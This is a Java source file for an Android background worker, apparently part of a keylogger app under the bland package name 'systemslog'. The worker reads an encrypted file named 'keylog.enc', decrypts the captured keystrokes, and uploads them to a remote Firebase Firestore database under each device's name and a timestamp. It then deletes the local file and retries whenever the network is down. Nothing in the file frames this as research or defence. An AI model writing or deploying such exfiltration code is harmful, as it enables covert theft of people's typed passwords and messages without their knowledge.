package com.example.systemslog;

import android.content.Context;
import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.example.systemslog.utils.DeviceInfo;
import com.google.firebase.firestore.FirebaseFirestore;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.*;

public class LogUploader extends Worker {
    public LogUploader(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        try {
            FileInputStream fis = getApplicationContext().openFileInput("keylog.enc");
            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
            String line;
            List<String> decryptedLogs = new ArrayList<>();

            while ((line = reader.readLine()) != null) {
                try {
                    String decrypted = EncryptionUtils.decrypt(line);
                    decryptedLogs.add(decrypted);
                } catch (Exception e) {
                    e.printStackTrace(); // skip failed decryption
                }
            }
            reader.close();

            if (!decryptedLogs.isEmpty()) {
                FirebaseFirestore db = FirebaseFirestore.getInstance();
                String deviceName = new DeviceInfo(getApplicationContext()).getName();
                String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
                String time = new SimpleDateFormat("HH-mm-ss", Locale.getDefault()).format(new Date());

                Map<String, Object> data = new HashMap<>();
                data.put("logs", decryptedLogs);

                db.collection("devices")
                        .document(deviceName)
                        .collection(date)
                        .document(time)
                        .set(data);

                getApplicationContext().deleteFile("keylog.enc");
            }

            return Result.success();
        } catch (Exception e) {
            e.printStackTrace();
            return Result.retry(); // Retry when internet returns
        }
    }
}
